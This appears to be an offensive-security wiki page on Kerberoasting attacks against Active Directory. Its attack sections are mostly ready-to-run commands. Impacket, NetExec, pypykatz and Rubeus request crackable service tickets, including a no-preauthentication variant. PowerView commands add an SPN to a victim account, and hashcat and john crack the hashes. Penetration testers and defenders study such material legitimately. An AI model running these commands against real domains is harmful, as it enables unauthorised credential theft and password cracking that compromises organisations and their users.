---
title: Kerberoast
tags:
  - active-directory
---
Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.

For executing **Kerberoasting**, a domain account capable of requesting **TGS tickets** is essential; however, this process does not demand **special privileges**, making it accessible to anyone with **valid domain credentials**.

Key Points:

- **Kerberoasting** targets **TGS tickets** for **user-account services** within **AD**.
    
- Tickets encrypted with keys from **user passwords** can be **cracked offline**.
    
- A service is identified by a **ServicePrincipalName** that is not null.
    
- **No special privileges** are needed, just **valid domain credentials**.

## Attack

>**Kerberoasting tools** typically request `**RC4 encryption**` when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. RC4 (type 23) hashes begin with `**$krb5tgs$23$***` while AES-256(type 18) start with `**$krb5tgs$18$***` `.`

>Unlike [ASREProasting](https://0xbara.github.io/hacking/Active-Directory/asreproast/), this attack can only be carried out with a prior foothold (valid domain credentials), except in the [Kerberoasting without pre-authentication](https://0xbara.github.io/hacking/Active-Directory/kerberoast/#kerberoast-without-pre-authentication) scenario.

=== "Linux"

	```bash
	# with a password
	GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
	
	# with an NT hash
	GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
	```

	This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).

	```bash
	nxc ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
	```

	Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
	
	```bash
	pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
	```

=== "Windows"

	[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
	
	```powershell
	Rubeus.exe kerberoast /outfile:kerberoastables.txt
	```

[Hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can then be used to try cracking the hash.

```
hashcat -m 13100 kerberoastables.txt $wordlist
```

```
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```

## Kerberoast without pre-authentication

In September 2022, [Charlie Cark](https://twitter.com/exploitph) explained how Service Tickets could be obtained through `AS-REQ` requests (which are usually used for TGT requests), instead of the usual `TGS-REQ`. He demonstrated (and [implemented](https://github.com/GhostPack/Rubeus/pull/139)) how to abuse this in a Kerberoasting scenario.

If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](https://0xbara.github.io/hacking/Active-Directory/asreproast/) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).

=== "Linux"

	The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.

	```bash
	GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
	```

	``` title="services.txt"
	srv01
	cifs/srv02.domain.local
	cifs/srv02
	```

=== "Windows"

	[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
	
	```powershell
	Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service"
	```

## Targeted Kerberoasting

If an attacker controls an account with the rights to add an SPN to another (`GenericAll`, `GenericWrite`), it can be abused to make that other account vulnerable to Kerberoast. A member of the [Account Operator](https://0xbara.github.io/hacking/Active-Directory/groups/) group usually has those permissions.

The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://0xbara.github.io/hacking/Active-Directory/kerberoast/). This technique is called Targeted Kerberoasting.

=== "Linux"

	From UNIX-like systems, this can be done with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) (Python)
	
	```bash
	targetedKerberoast.py -v -d $DOMAIN_FQDN -u $USER -p $PASSWORD
	```

=== "Windows"

	From Windows machines, this can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
	
	```powershell
	# Make sure that the target account has no SPN
	Get-DomainUser 'victimuser' | Select serviceprincipalname
	
	# Set the SPN
	Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
	
	# Obtain a kerberoast hash
	$User = Get-DomainUser 'victimuser'
	$User | Get-DomainSPNTicket | fl
	
	# Clear the SPNs of the target account
	$User | Select serviceprincipalname
	Set-DomainObject -Identity victimuser -Clear serviceprincipalname
	```

Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.

**References:**

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
- https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting